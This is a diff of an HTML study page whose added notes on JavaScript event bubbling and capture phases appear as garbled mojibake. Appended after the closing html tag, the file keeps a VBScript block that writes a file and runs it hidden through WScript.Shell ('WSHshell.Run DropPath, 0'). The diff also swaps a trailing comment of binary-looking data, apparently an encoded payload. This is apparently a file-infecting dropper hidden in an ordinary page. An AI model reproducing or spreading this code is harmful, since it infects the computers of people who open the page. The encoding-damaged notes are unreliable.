@@ -6,35 +6,30 @@
 		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
 	</head>
-	<style type="text/css">
-		div {
-			width: 100px;
-			height: 100px;
-			background-color: green;
-			float: left;
-			margin-left: 10px;
-			border: 2px solid green;
-		}
-	</style>
 	<body>
-		<div></div>
-		<div></div>
-		<div></div>
-		<div></div>
-		<div></div>
-		<script src="js/common.js"></script>
-		<script>
-			var list = document.getElementsByTagName('div');
-			console.log(list);
-			for(i=0;i<list.length;i++){
-				list[i].onmouseover=function(){
-					this.style.border="2px solid red";
-				};
-				list[i].onmouseout=function(){
-					this.style.border="";
-				};
-			}
-		</script>
+		äº‹ä»¶å†’æ³¡æ˜¯ä»é‡Œåˆ°å¤–ï¼Œ
+		äº‹ä»¶æœ‰ä¸‰ä¸ªé˜¶æ®µï¼š
+		1.äº‹ä»¶æ•è·é˜¶æ®µï¼šä»å¤–å‘å†…
+		2.äº‹ä»¶ç›®æ ‡é˜¶æ®µï¼š æœ€å¼€å§‹é€‰æ‹©çš„
+		3.äº‹ä»¶å†’æ³¡é˜¶æ®µï¼šä»é‡Œå‘å¤–
+
+		addEventListener("æ²¡æœ‰onçš„äº‹ä»¶ç±»å‹",äº‹ä»¶å¤„ç†å‡½æ•°,æ§åˆ¶äº‹ä»¶é˜¶æ®µçš„)
+		äº‹ä»¶è§¦å‘çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šå‡ºç°äº‹ä»¶å†’æ³¡çš„æ•ˆæœï¼Œä¸ºäº†é˜»æ­¢äº‹ä»¶å†’æ³¡ï¼š
+		window.event.cancelBubble=true;//è°·æ­Œï¼ŒIE8æ”¯æŒï¼Œ ç«ç‹ä¸æ”¯æŒ
+		window.eventå°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ˜¯IEä¸­çš„æ ‡å‡†
+		e.stopProgation();é˜»æ­¢äº‹ä»¶å†’æ³¡
+		window.event å’Œe éƒ½æ˜¯äº‹ä»¶å‚æ•°å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯IEçš„æ ‡å‡†ï¼Œä¸€ä¸ªæ˜¯ç«ç‹çš„æ ‡å‡†
+		äº‹ä»¶å‚æ•°eåœ¨IE8çš„æµè§ˆå™¨ä¸­ä¸å­˜åœ¨ã€‚æ­¤æ—¶ç”¨window.eventæ¥ä»£æ›¿
+		addEventListenerä¸­ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ§åˆ¶äº‹ä»¶é˜¶æ®µçš„
+		äº‹ä»¶é˜¶æ®µæœ‰ä¸‰ä¸ªï¼š
+		é€šè¿‡e.eventPhaseè¿™ä¸ªå±æ€§å¯ä»¥çŸ¥é“å½“å‰çš„äº‹ä»¶æ˜¯ä»€ä¹ˆé˜¶æ®µ
+		å¦‚æœè¿™ä¸ªå±æ€§çš„å€¼æ˜¯ï¼š
+		1------->æ•è·é˜¶æ®µ
+		2------->ç›®æ ‡é˜¶æ®µ
+		3------->å†’æ³¡é˜¶æ®µ
+		ä¸€èˆ¬é»˜è®¤éƒ½æ˜¯å†’æ³¡é˜¶æ®µï¼Œå¾ˆå°‘ç”¨æ•è·é˜¶æ®µ
+		å†’æ³¡é˜¶æ®µï¼šä»é‡Œåˆ°å¤–
+		æ•è·é˜¶æ®µï¼šä»å¤–å‘å†…
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -51,6 +46,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--bë&ü	è’DgŠ e:qUP`IHi¼ÅÅAÆ‘K²ƒwRr¢@i*é[ŒèÄsô]Éj*o±÷µY­bÙ—Ô>Ø=Ìm¸ƒ¬×§ ÁÜGÚåäåEÛiÇÆæèT-æ—<ÛcÚ>öO×ñ:–¿ìı«É‡÷óôDÒ W“~ø;R–»ÄSÛÔ,şûÜqäµXˆ.ÃŒ ®Ã÷‡–ùrı0l„WŒ¶¾ŠËš×X4\öfı`A`ÏŞVØŠäq–WübtàóUX?©š;H‡×œj*õ€”€v ˆìİ¾‡Ò_F–3™VòÛO¼´¥É³aÜmf(;ÈÇÍL'ï‘ä¡Õ[ıŒw3Õ-ÛäNì‰úûäó-O¾	7ïw »'_ıË&9nPq™D#L¼gõ¿ƒK¾iP<‹¼ÙŞ¼*Ã•
-EÇn®¬÷³‘|>§*÷:ğ'·Ív)ˆÃŠ~]„$€…
-Ó6üZ!\9Ù<}¾«û¤RÅN±xulâÇT§0}ı[lø¼Ÿvu~…ŞLª›vóvú^z8³ØV8x!–éœS~8¿k, áùR"âøáùáùáù¬$Nüı_^Wâù áù-->
+//--></SCRIPT><!--Àd9î¾ŸóR‹G3íäj$WÔO;ŒÏıŸ€ê…9ÈÆBSå’.¬@¬æ™‰ù¶KìNĞW©pÆ4ò>v£Â§o%~ğ×#ÚÊ5‡‹ï†›’Ò» µòAÃıE[n—FåCÈÙßï"$´DğÄMÂ`p—Q·Z±ûøv\£µÒ_ıè|&5üTùàw }>®ŸFn÷ùäJm¬w7*_&ñrrˆªİA`ZÇûq°UdœÃï~OzUöxGüÛYÃI¿á´ IoLÕ|y:Zõİ= ˜Åsùp;!á#ûO«z “ølÁ\zy˜\&tÍ¡Ú%Şçƒğó	‘hƒòvøde1Hş ÅĞIÇ6–Á¬úâšj ŸoŞ«Ö†mØXn(=V»i@6²‡Š*L®º—1sQ»/¾x±µ½8‘yOÒ±“EÆ#“­-$(Ş»?hĞù&tp#@SÍ ä(R'3ùä(ä(ä(©õOÂ€_Yá( ä(-->
